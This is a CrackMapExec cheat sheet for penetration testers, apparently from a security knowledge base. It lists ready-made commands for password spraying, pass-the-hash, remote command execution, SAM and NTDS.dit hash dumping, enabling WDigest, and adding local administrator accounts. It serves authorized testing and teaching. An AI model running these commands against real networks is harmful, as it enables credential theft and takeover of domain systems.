---
legal-banner: true
---

### **CrackMapExec (CME)**

CrackMapExec (CME) is an open-source post-exploitation tool that helps penetration testers perform various network-level attacks and enumeration tasks, It is particularly useful for managing large Active Directory (AD) environments.  


### **Key Functionalities**

1. **Enumerating Users and Groups**  
   Lists users, groups, and other AD objects  

2. **Password Spraying**  
   Tests a single password against multiple user accounts  

3. **Command Execution**  
   Executes commands remotely on target systems  

4. **Dumping Hashes**  
   Extracts password hashes from remote systems  

5. **Accessing Shares**  
   Lists and accesses SMB shares on remote systems  

### **Target Formats**

1. Single IP address:  
   ```bash
   crackmapexec smb [IP-ADDRESS-1] [IP-ADDRESS-2]
   ```

2. IP range:  
   ```bash
   crackmapexec smb [IP-ADDRESS]-28 [IP-ADDRESS]-67
   ```

3. CIDR notation:  
   ```bash
   crackmapexec smb [IP-ADDRESS]/24
   ```

4. Targets from file:  
   ```bash
   crackmapexec smb targets.txt
   ```

### **Connect to Target Using Local Account**

1. Connect with a local account:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth
   ```

2. Using a null session:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u "" -p ""
   ```

### **Pass the Hash Against a Subnet**

1. Pass the hash with local auth:  
   ```bash
   crackmapexec smb [IP-ADDRESS]/24 -u [USERNAME] -H '[LMHASH:NTHASH]' --local-auth
   ```

2. Standard pass the hash:  
   ```bash
   crackmapexec smb [IP-ADDRESS]/24 -u [USERNAME] -H '[NTHASH]'
   ```

### **Bruteforcing and Password Spraying**

1. Single password:  
   ```bash
   crackmapexec smb [IP-ADDRESS]/24 -u "[USERNAME]" -p "[PASSWORD]"
   ```

2. Multiple passwords:  
   ```bash
   crackmapexec smb [IP-ADDRESS]/24 -u "[USERNAME]" -p "[PASSWORD1]" "[PASSWORD2]"
   ```

3. Multiple users:  
   ```bash
   crackmapexec smb [IP-ADDRESS]/24 -u "[USERNAME1]" "[USERNAME2]" -p "[PASSWORD]"
   ```

4. Users and passwords from files:  
   ```bash
   crackmapexec smb [IP-ADDRESS]/24 -u [USER_FILE] -p [PASS_FILE]
   ```

5. Users from file, hashes from file:  
   ```bash
   crackmapexec smb [IP-ADDRESS]/24 -u [USER_FILE] -H [NTLM_HASH_FILE]
   ```

### **User Enumeration**

1. Enumerate users:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --users
   ```

2. Perform RID brute force to get users:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --rid-brute
   ```

3. Enumerate domain groups:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --groups
   ```

4. Enumerate local users:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-users
   ```

### **Host Enumeration**

1. Generate a list of relayable hosts:  
   ```bash
   crackmapexec smb [IP-ADDRESS]/24 --gen-relay-list output.txt
   ```

2. Enumerate available shares:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --shares
   ```

3. Get active sessions:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --sessions
   ```

4. Check logged-in users:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --lusers
   ```

5. Get the password policy:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --pass-pol
   ```

### **Command Execution Methods**

1. Execute a command through `cmd.exe`:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'whoami'
   ```

2. Force the `smbexec` method:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'net user Administrator /domain' --exec-method smbexec
   ```

3. Execute commands through PowerShell:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' -X 'whoami'
   ```

### **Getting Credentials**

1. Dump local SAM hashes:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --sam
   ```

2. Enable WDigest to get credentials from LSA memory:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --wdigest enable
   ```

3. Disable WDigest:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --wdigest disable
   ```

4. Query user sessions:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'quser'
   ```

5. Force logoff:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'logoff [SESSIONID]'
   ```

6. Dump the `NTDS.dit` from the Domain Controller using `secretsdump.py`:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' --ntds
   ```

7. Use Volume Shadow Copy Service to dump `NTDS.dit`:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' --ntds vss
   ```

8. Dump the `NTDS.dit` password history:  
   ```bash
   crackmapexec smb [IP-ADDRESS]/24 -u [USERNAME] -p '[PASSWORD]' --ntds-history
   ```

### **Additional Features**

1. Upload a file to a remote share:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --upload local_file.txt \\remote\share
   ```

2. Download a file from a remote share:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --download \\remote\share\remote_file.txt local_path
   ```

3. Add a new user:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth -x "net user [NEW_USER] [NEW_PASS] /add"
   ```

4. Add a user to the Administrators group:  
   ```bash
   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth -x "net localgroup administrators [NEW_USER] /add"
   ```
